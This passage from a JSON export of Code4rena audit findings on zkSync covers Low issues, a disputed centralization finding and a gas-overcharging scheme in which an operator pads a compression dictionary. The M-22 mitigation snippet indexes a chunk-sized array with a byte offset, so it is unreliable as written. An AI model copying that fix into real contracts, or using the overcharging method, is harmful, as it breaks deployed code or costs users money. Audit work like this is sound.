      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30310",
      "title": "[08] The front-end may return a wrong value for the L2 transaction base cost",
      "impact": "LOW",
      "content": "\nIn [Mailbox, function `l2TransactionBaseCost`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L166C1-L166C36) is not called in the whole project, so it seems it will be called by the front-end to show users an estimation of their transaction cost. However, they do permit to pass an arbitrary `_l2GasPerPubdataByteLimit` whilst function `requestL2Transaction` requires that it is equal to `REQUIRED_L2_GAS_PRICE_PER_PUBDATA`, whose value is `800` (see [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/SystemConfig.json#L18)). I do recommend to hard-code the value in `l2TransactionBaseCost` to **NOT** return misleading estimations to users:\n\n```diff\n    function l2TransactionBaseCost(\n        uint256 _gasPrice,\n-       uint256 _l2GasLimit,\n-       uint256 _l2GasPerPubdataByteLimit\n+       uint256 _l2GasLimit\n    ) public pure returns (uint256) {\n-         uint256 l2GasPrice = _deriveL2GasPrice(_gasPrice, _l2GasPerPubdataByteLimit);\n+         uint256 l2GasPrice = _deriveL2GasPrice(_gasPrice, REQUIRED_L2_GAS_PRICE_PER_PUBDATA);\n          return l2GasPrice * _l2GasLimit;\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30309",
      "title": "[07] `getZkSyncMeta` does not populate fully the `ZkSyncMeta` struct",
      "impact": "LOW",
      "content": "\nIn [SystemContractHelper, function `getZkSyncMeta`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L297C1-L303C6) constructs the `ZkSyncMeta` struct from the bytes returned by `getZkSyncMetaBytes()`. However, the fields `heapSize` and `auxHeapSize` are not populated, so they default to `0`. As the only field that is being used in the repo is `gasPerPubdataByte`, I am putting it as a Low.\n\n```diff\n    function getZkSyncMeta() internal view returns (ZkSyncMeta memory meta) {\n        uint256 metaPacked = getZkSyncMetaBytes();\n        meta.gasPerPubdataByte = getGasPerPubdataByteFromMeta(metaPacked);\n        meta.shardId = getShardIdFromMeta(metaPacked);\n        meta.callerShardId = getCallerShardIdFromMeta(metaPacked);\n        meta.codeShardId = getCodeShardIdFromMeta(metaPacked);\n+       meta.heapSize = getHeapSizeFromMeta(metaPacked);\n+       meta.auxHeapSize = getAuxHeapSizeFromMeta(metaPacked);\n    }\n```\n\nFor reference, the struct is:\n\n```solidity\nstruct ZkSyncMeta {\n    uint32 gasPerPubdataByte;\n    uint32 heapSize;\n    uint32 auxHeapSize;\n    uint8 shardId;\n    uint8 callerShardId;\n    uint8 codeShardId;\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30308",
      "title": "[06] `basefee` may be higher than `maxPriorityFeePerGas`",
      "impact": "LOW",
      "content": "\nIn [bootloader, function `getGasPrice`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1030C1-L1052C14) checks the correctness of the fee parameters, namely:\n\n- maxPriorityFeePerGas > maxFeePerGas \\ ? \\ revert : proceed\n- baseFee > maxFeePerGas \\ ? \\ revert : proceed\n\nBut it does not check that:\n\n- baseFee > maxPriorityFeePerGas \\ ? \\ revert : proceed\n\nThe operator may charge users requesting priority operations more than what they initially allowed:\n\n```diff\n            /// @dev Returns the gas price that should be used by the transaction \n            /// based on the EIP1559's maxFeePerGas and maxPriorityFeePerGas.\n            /// The following invariants should hold:\n            /// maxPriorityFeePerGas <= maxFeePerGas\n-           /// baseFee <= maxFeePerGas\n+           /// baseFee <= maxPriorityFeePerGas\n            /// While we charge baseFee from the users, the method is mostly used as a method for validating \n            /// the correctness of the fee parameters\n            function getGasPrice(\n                maxFeePerGas,\n                maxPriorityFeePerGas\n            ) -> ret {\n                let baseFee := basefee()\n\n                if gt(maxPriorityFeePerGas, maxFeePerGas) {\n                    revertWithReason(\n                        MAX_PRIORITY_FEE_PER_GAS_GREATER_THAN_MAX_FEE_PER_GAS(),\n                        0\n                    )\n                }\n\n-               if gt(baseFee, maxFeePerGas) {\n+               if gt(baseFee, maxPriorityFeePerGas) {\n                    revertWithReason(\n-                       BASE_FEE_GREATER_THAN_MAX_FEE_PER_GAS(),\n+                       BASE_FEE_GREATER_THAN_MAX_PRIORITY_FEE_PER_GAS(), // add it and remove `BASE_FEE_GREATER_THAN_MAX_FEE_PER_GAS` at line 3384\n                        0\n                    )\n                }\n\n                // We always use `baseFee` to charge the transaction \n                ret := baseFee\n            }\n```\n\n so that we have baseFee less than or equal to maxPriorityFeePerGas less than or equal to maxFeePerGas.\n \n Right now, `maxPriorityFeePerGas` is hard-coded to `0`.\n\n```solidity\n// Mailbox\n\n    function _serializeL2Transaction(\n        WritePriorityOpParams memory _priorityOpParams,\n        bytes calldata _calldata,\n        bytes[] calldata _factoryDeps\n    ) internal pure returns (L2CanonicalTransaction memory transaction) {\n        transaction = L2CanonicalTransaction({\n        txType: PRIORITY_OPERATION_L2_TX_TYPE,\n        from: uint256(uint160(_priorityOpParams.sender)),\n        to: uint256(uint160(_priorityOpParams.contractAddressL2)),\n        gasLimit: _priorityOpParams.l2GasLimit,\n        gasPerPubdataByteLimit: _priorityOpParams.l2GasPricePerPubdata,\n        maxFeePerGas: uint256(_priorityOpParams.l2GasPrice),\n        maxPriorityFeePerGas: uint256(0),<========================================================= HERE\n        paymaster: uint256(0),\n        // Note, that the priority operation id is used as \"nonce\" for `L1->L2` transactions\n        nonce: uint256(_priorityOpParams.txId),\n        value: _priorityOpParams.l2Value,\n        reserved: [_priorityOpParams.valueToMint, uint256(uint160(_priorityOpParams.refundRecipient)), 0, 0],\n        data: _calldata,\n        signature: new bytes(0),\n        factoryDeps: _hashFactoryDeps(_factoryDeps),\n        paymasterInput: new bytes(0),\n        reservedDynamic: new bytes(0)\n    });\n```\n\nNoted as low instead of the Medium, but when you update that make sure that the invariants above hold, making the operator unable to charge users more than what they specified.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30307",
      "title": "[05] Code and comment mismatch",
      "impact": "LOW",
      "content": "\nIn [ContractDeployer, lines 159](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/ContractDeployer.sol#L159C1-L159C71) and [182](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/ContractDeployer.sol#L182C1-L182C71) it says `@dev In case of a revert, the zero address should be returned`, but the functions `create2Account` and `createAccount` revert the whole transaction instead. Consider either removing those comments or putting the code in a `try`/`catch` block, so that it returns `address(0)` in the `catch` block.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30306",
      "title": "[04] Unused variables (missing logic?)",
      "impact": "LOW",
      "content": "\nIn [bootloader, lines 2325 to 2326](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L2325C1-L2326C45), the local variables `dataLength` and `data` are not used. I'm putting this as a low as I do not know if there is some missing logic.\n\nIn [bootloader, line 1296](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1296), the local variables `innerTxDataOffset` is not used. I'm putting this as a low as I do not know if there is some missing logic.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30305",
      "title": "[03] Changing addresses sizes from 20 to 32 bytes could break some parts of the system",
      "impact": "LOW",
      "content": "\nIn [ImmutableSimulator, line 20](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/ImmutableSimulator.sol#L20), it says `@notice that address uses uint256 type to leave the option to introduce 32-bytes address space in future` which is a pretty bad idea as:\n\n- It breaks compatibility with the EVM and **MANY** other chains (if not all).\n- Your own code casts `address` to `uint160` pretty often. Changing the size of the `address` type may lead to collisions or losing information with addresses whose value is higher than `type(uint160).max`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30304",
      "title": "[02] Code is unreachable",
      "impact": "LOW",
      "content": "\nIn [Mailbox, function `_verifyDepositLimit`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L275C1-L281C6), the code after the `if` statement is never executed as `address(0)` is hard-coded and ETH deposits are uncapped (see the comment):\n\n```solidity\n    function _verifyDepositLimit(address _depositor, uint256 _amount) internal {\n        IAllowList.Deposit memory limitData = IAllowList(s.allowList).getTokenDepositLimitData(address(0)); // address(0) denotes the ETH\n        if (!limitData.depositLimitation) return; // no deposit limitation is placed for ETH\n\n        require(s.totalDepositedAmountPerUser[_depositor] + _amount <= limitData.depositCap, \"d2\");\n        s.totalDepositedAmountPerUser[_depositor] += _amount;\n    }\n```\n\nAlthough, [AllowList, function `setDepositLimit`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/common/AllowList.sol#L129C1-L132C6) does **NOT** enforce it.\n\n```solidity\n    function setDepositLimit(\n  address _l1Token,\n  bool _depositLimitation,\n  uint256 _depositCap\n) external onlyOwner {\n  tokenDeposit[_l1Token].depositLimitation = _depositLimitation;\n  tokenDeposit[_l1Token].depositCap = _depositCap;\n}\n```\n\nConsider changing it to `revert` if trying to cap ETH deposits.\n\n```diff\n    function setDepositLimit(\n        address _l1Token,\n        bool _depositLimitation,\n        uint256 _depositCap\n    ) external onlyOwner {\n+       require(_l1Token != address(0), \"ETH deposits cannot be limited\");\n        tokenDeposit[_l1Token].depositLimitation = _depositLimitation;\n        tokenDeposit[_l1Token].depositCap = _depositCap;\n    }\n```\n\nAlso, consider removing the whole `_verifyDepositLimit` function, as it will always return without modifying the state of the contract (tautology).\n\n```diff\n-   function _verifyDepositLimit(address _depositor, uint256 _amount) internal {\n-       IAllowList.Deposit memory limitData = IAllowList(s.allowList).getTokenDepositLimitData(address(0)); // address(0) denotes the ETH\n-       if (!limitData.depositLimitation) return; // no deposit limitation is placed for ETH \n\n-       require(s.totalDepositedAmountPerUser[_depositor] + _amount <= limitData.depositCap, \"d2\");\n-       s.totalDepositedAmountPerUser[_depositor] += _amount;\n-   }\n```\n\nNOTE: `Mailbox` is for ETH, which is uncapped, and tokens are bridged via the bridges, which do check for the deposit limits themselves, so there is no place for that function here.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30303",
      "title": "[01] Dangerous execution path",
      "impact": "LOW",
      "content": "\nIn [L1WethBridge, function `deposit`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L143C1-L151C50), and [L1ERC20Bridge, function `deposit`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L161C1-L169C50), some invariants must hold to apply address aliasing to the refund recipient:\n\n1. `_refundRecipient` on L2 = `_refundRecipient` if it is an EOA in L1.\n2. `_refundRecipient` on L2 = `alias(_refundRecipient)` if it is **NOT** an EOA in L1.\n3. `_refundRecipient` on L2 = `msg.sender` if it is an EOA in L1 **AND** `_refundRecipient` is `address(0)`.\n4. `_refundRecipient` on L2 = `alias(msg.sender)` if it is **NOT** an EOA in L1 **AND** `_refundRecipient` is `address(0)`.\n\nFor that, both bridges check 3 and 4 by doing:\n\n```solidity\n        address refundRecipient = _refundRecipient;\nif (_refundRecipient == address(0)) {\nrefundRecipient = msg.sender != tx.origin ? AddressAliasHelper.applyL1ToL2Alias(msg.sender) : msg.sender;\n}\n```\n\n`refundRecipient` is used as an argument to [Mailbox, requestL2Transaction](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236). The issue is that [Mailbox, requestL2Transaction](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236) does apply address aliasing too (checks 1 and 2).\n\n[Mailbox, lines 309 to 314](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L309C1-L314C10)\n\n```solidity\n        // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.\n        address refundRecipient = _refundRecipient == address(0) ? _sender : _refundRecipient;\n        // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.\n        if (refundRecipient.code.length > 0) {\n            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);\n        }\n```\n\nThere is an edge case that breaks our four invariants:\n\n`_refundRecipient` on L2 = `alias(alias(msg.sender))` if `msg.sender` is **NOT** an EOA in L1 **AND** `alias(msg.sender)` is **NOT** an EOA in L1 **and** `_refundRecipient` is `address(0)`.\n\nThis is bad because the excess of gas may be sent to the wrong `_refundRecipient` or, even worst, if a WETH transfer fails on L2, the whole amount transferred. Although **VERY** unlikely to occur (`2^k` execution steps to find a collision), I would remove this possibility from happening by modifying the code in both bridges:\n\n```diff\n         // If the refund recipient is not specified, the refund will be sent to the sender of the transaction.\n         // Otherwise, the refund will be sent to the specified address.\n         // If the recipient is a contract on L1, the address alias will be applied.\n         address refundRecipient = _refundRecipient;\n         if (_refundRecipient == address(0)) {\n-            refundRecipient = msg.sender != tx.origin ? AddressAliasHelper.applyL1ToL2Alias(msg.sender) : msg.sender;\n+            refundRecipient = msg.sender; // it will be aliased by Mailbox if it is a contract and will default to msg.sender if EOA\n        }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30302",
      "title": "M-23 The `owner` is a single point of failure and a centralization risk",
      "impact": "MEDIUM",
      "content": "\n\n*Note: This finding was reported via the winning [Automated Findings report](https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327). It was declared out of scope for the audit, but is being included here for completeness.*\n\nHaving a single EOA as the only owner of contracts is a large centralization risk and a single point of failure. A single private key may be taken in a hack, or the sole holder of the key may become unable to retrieve the key when necessary, or the single owner can become malicious and perform a rug-pull. Consider changing to a multi-signature setup, and or having a role-based authorization model.\n\n*There are 24 instances of this issue:*\n\n```solidity\nFile: cache/solpp-generated-contracts/common/AllowList.sol\n\n51:      function setAccessMode(address _target, AccessMode _accessMode) external onlyOwner {\n\n60:      function setBatchAccessMode(address[] calldata _targets, AccessMode[] calldata _accessModes) external onlyOwner {\n\n85       function setBatchPermissionToCall(\n86           address[] calldata _callers,\n87           address[] calldata _targets,\n88           bytes4[] calldata _functionSigs,\n89           bool[] calldata _enables\n90:      ) external onlyOwner {\n\n108      function setPermissionToCall(\n109          address _caller,\n110          address _target,\n111          bytes4 _functionSig,\n112          bool _enable\n113:     ) external onlyOwner {\n\n131:     function setDepositLimit(address _l1Token, bool _depositLimitation, uint256 _depositCap) external onlyOwner {\n\n```\n*GitHub*: [51](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L49-L49), [60](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L58-L58), [85](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L83-L88), [108](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L106-L111), [131](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L129-L129)\n\n```solidity\nFile: cache/solpp-generated-contracts/governance/Governance.sol\n\n131:     function scheduleTransparent(Operation calldata _operation, uint256 _delay) external onlyOwner {\n\n144:     function scheduleShadow(bytes32 _id, uint256 _delay) external onlyOwner {\n\n156:     function cancel(bytes32 _id) external onlyOwnerOrSecurityCouncil {\n\n169:     function execute(Operation calldata _operation) external onlyOwnerOrSecurityCouncil {\n\n```\n*GitHub*: [131](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/governance/Governance.sol#L129-L129), [144](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/governance/Governance.sol#L142-L142), [156](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/governance/Governance.sol#L154-L154), [169](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/governance/Governance.sol#L167-L167)\n\n```solidity\nFile: cache/solpp-generated-contracts/zksync/ValidatorTimelock.sol\n\n54:      function setValidator(address _newValidator) external onlyOwner {\n\n61:      function setExecutionDelay(uint32 _executionDelay) external onlyOwner {\n\n```\n*GitHub*: [54](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/ValidatorTimelock.sol#L52-L52), [61](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/ValidatorTimelock.sol#L59-L59)\n\n```solidity\nFile: cache/solpp-generated-contracts/zksync/facets/Admin.sol\n\n22:      function setPendingGovernor(address _newPendingGovernor) external onlyGovernor {\n\n46:      function setPendingAdmin(address _newPendingAdmin) external onlyGovernorOrAdmin {\n\n70:      function setValidator(address _validator, bool _active) external onlyGovernorOrAdmin {\n\n77:      function setPorterAvailability(bool _zkPorterIsAvailable) external onlyGovernor {\n\n85:      function setPriorityTxMaxGasLimit(uint256 _newPriorityTxMaxGasLimit) external onlyGovernor {\n\n100:     function executeUpgrade(Diamond.DiamondCutData calldata _diamondCut) external onlyGovernor {\n\n111:     function freezeDiamond() external onlyGovernor {\n\n122:     function unfreezeDiamond() external onlyGovernorOrAdmin {\n\n```\n*GitHub*: [22](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L20-L20), [46](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L44-L44), [70](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L68-L68), [77](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L75-L75), [85](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L83-L83), [100](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L98-L98), [111](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L109-L109), [122](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L120-L120)\n\n```solidity\nFile: cache-zk/solpp-generated-contracts/NonceHolder.sol\n\n84:      function setValueUnderNonce(uint256 _key, uint256 _value) public onlySystemCall {\n\n```\n*GitHub*: [84](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/NonceHolder.sol#L82-L82)\n\n```solidity\nFile: cache-zk/solpp-generated-contracts/SystemContext.sol\n\n89:      function setTxOrigin(address _newOrigin) external onlyCallFromBootloader {\n\n95:      function setGasPrice(uint256 _gasPrice) external onlyCallFromBootloader {\n\n314      function setL2Block(\n315          uint128 _l2BlockNumber,\n316          uint128 _l2BlockTimestamp,\n317          bytes32 _expectedPrevL2BlockHash,\n318          bool _isFirstInBatch,\n319          uint128 _maxVirtualBlocksToCreate\n320:     ) external onlyCallFromBootloader {\n\n418      function setNewBatch(\n419          bytes32 _prevBatchHash,\n420          uint128 _newTimestamp,\n421          uint128 _expectedNewNumber,\n422          uint256 _baseFee\n423:     ) external onlyCallFromBootloader {\n\n```\n*GitHub*: [89](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/SystemContext.sol#L87-L87), [95](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/SystemContext.sol#L93-L93), [314](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/SystemContext.sol#L312-L318), [418](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/SystemContext.sol#L416-L421)\n\n**[Alex the Entreprenerd (judge) commented](https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327?permalink_comment_id=4877666#gistcomment-4877666):**\n> I believe it is correct to add to the report. Although, post Supreme Court it would not be accepted, and instead would have had to be added to the Analysis.\n\n**[vladbochok (zkSync) disputed and commented](https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327?permalink_comment_id=4942620#gistcomment-4942620):**\n> This is not true, the admin role is not an EOA, but a multisig and is a matter of configuration to the different environments - localhost, testnet and mainnet. So we dispute that this is an issue at all. Moreover, the upgradability is intended training wheels for the current state of L2 protocols.\n\n***\n\n",
      "summary": "\nThe report states that there is a potential vulnerability in the contracts of the zkSync platform. This vulnerability involves having a single externally owned account (EOA) as the only owner of the contracts, which can pose a risk of centralization and a single point of failure. This can happen if the private key is hacked, lost, or if the owner becomes malicious. The report suggests changing to a multi-signature setup or implementing a role-based authorization model. The report also lists 24 instances of this issue in different contract files. The developers of zkSync have disputed this issue, stating that the admin role is not an EOA and is configured differently in different environments. They also mention that the upgradability feature is intended as a temporary measure for the current state of layer two (L2) protocols.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327#m01-the-owner-is-a-single-point-of-failure-and-a-centralization-risk",
      "tags": [],
      "finders": [
        "IllIllI-bot"
      ]
    },
    {
      "id": "30301",
      "title": "[M-22] Potential Gas Manipulation via Bytecode Compression",
      "impact": "MEDIUM",
      "content": "\nMalicious operators could exploit this issue to overcharge users by artificially increasing the length of the dictionary without any benefit to the encoding process. As a result, users may end up paying higher gas costs for message publication in L1, leading to an adverse financial impact. This issue undermines the intended efficiency and cost-effectiveness of the compression mechanism.\n\n### Proof of Concept\n\nWhen processing L2 transactions, it is essential to mark the user's provided `factoryDeps` on L2 and subsequently publish them to L1.\n\n`bootloader::processL2Tx >> bootloader::l2TxExecution >> bootloader::ZKSYNC_NEAR_CALL_markFactoryDepsL2 >> bootloader::sendCompressedBytecode >> Compressor::publishCompressedBytecode` \n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/Compressor.sol#L54>\n\nThis process involves compression to reduce gas consumption during publishing to L1. The sequence of actions are as follows:\n\n1. The remaining gas allocated by the user is utilized to initiate the publication of `factoryDeps`.\n\n    <https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1242>\n\n2. Compressed data is sent to L1.\n\n    <https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/Compressor.sol#L79>\n\n3. Gas consumption is determined by the length of the transmitted message.\n\n    <https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/L1Messenger.sol#L153>\n\nHowever, this process could be exploited by a malicious operator to overcharge users. Through manipulation of the compression method, the operator could inflate gas costs. In this context, not only may the compressed bytecode fail to be shorter than the original, but it could even become longer.\n\nTo illustrate, consider an example where the bytecode to be compressed and published is `ABCB` (with each character representing 8 bytes). Notably, the second and fourth 8-byte segments are identical.\n\nIn an ideal compression scenario, the `_rawCompressedData` would appear as: `0x0003ABC0000000100020001`. Here, `ABC` forms the `dictionary`, and `encodedData` is `0x0000000100020001`. The prefix `0x0003` indicates the dictionary's length in 8-byte segments, while the `encodedData` references the dictionary's segments in this order: `0, 1, 2, 1`, which corresponds to `A, B, C, and B`, respectively.\n\nHowever, a malicious operator, could artificially extend the dictionary length. They might modify `_rawCompressedData` to be: `0x0004ABCX0000000100020001`. In this scenario, `ABCX` constitutes the `dictionary`, while `encodedData` remains `0x0000000100020001`. This essentially introduces an extra 8-byte `X` to the dictionary, which serves no functional purpose, just increases the dictionary length. The `encodedData` still references the same segments, `0, 1, 2, 1`, without employing the added `X`.\n\nIn summary, this manipulation increases the dictionary's length by appending an unnecessary chunk, while not functional, this lengthening of the dictionary results in higher charges for users. Importantly, the dictionary remains valid, as it remains possible to decode the original bytecode from `_rawCompressedData` using the `encodedData`.\n\n### Recommended Mitigation Steps\n\nThe function `publishCompressedBytecode` should be revised as follows, where an array named `usedDictionaryIndex` is introduced to monitor the utilization of dictionary chunks. Subsequently, it validates whether all chunks in the dictionary have been utilized.\n\n```solidity\nfunction publishCompressedBytecode(\n        bytes calldata _bytecode,\n        bytes calldata _rawCompressedData\n    ) external payable onlyCallFromBootloader returns (bytes32 bytecodeHash) {\n        unchecked {\n            (bytes calldata dictionary, bytes calldata encodedData) = _decodeRawBytecode(_rawCompressedData);\n\n            require(dictionary.length % 8 == 0, \"Dictionary length should be a multiple of 8\");\n            require(dictionary.length <= 2 ** 16 * 8, \"Dictionary is too big\");\n            require(\n                encodedData.length * 4 == _bytecode.length,\n                \"Encoded data length should be 4 times shorter than the original bytecode\"\n            );\n\n            // This code is added\n            bool[] memory usedDictionaryIndex = new bool[](\n                dictionary.length / 8\n            );\n            //////////////////////\n\n            for (uint256 encodedDataPointer = 0; encodedDataPointer < encodedData.length; encodedDataPointer += 2) {\n                uint256 indexOfEncodedChunk = uint256(encodedData.readUint16(encodedDataPointer)) * 8;\n                require(indexOfEncodedChunk < dictionary.length, \"Encoded chunk index is out of bounds\");\n\n                // This code is added\n                usedDictionaryIndex[indexOfEncodedChunk] = true;\n                //////////////////////\n\n                uint64 encodedChunk = dictionary.readUint64(indexOfEncodedChunk);\n                uint64 realChunk = _bytecode.readUint64(encodedDataPointer * 4);\n\n                require(encodedChunk == realChunk, \"Encoded chunk does not match the original bytecode\");\n            }\n\n            // This code is added\n            for (uint256 i = 0; i < usedDictionaryIndex.length; ++i) {\n                require(\n                    usedDictionaryIndex[i],\n                    \"the dictionary includes chunks that are useless\"\n                );\n            }\n            //////////////////////\n        }\n\n        bytecodeHash = Utils.hashL2Bytecode(_bytecode);\n    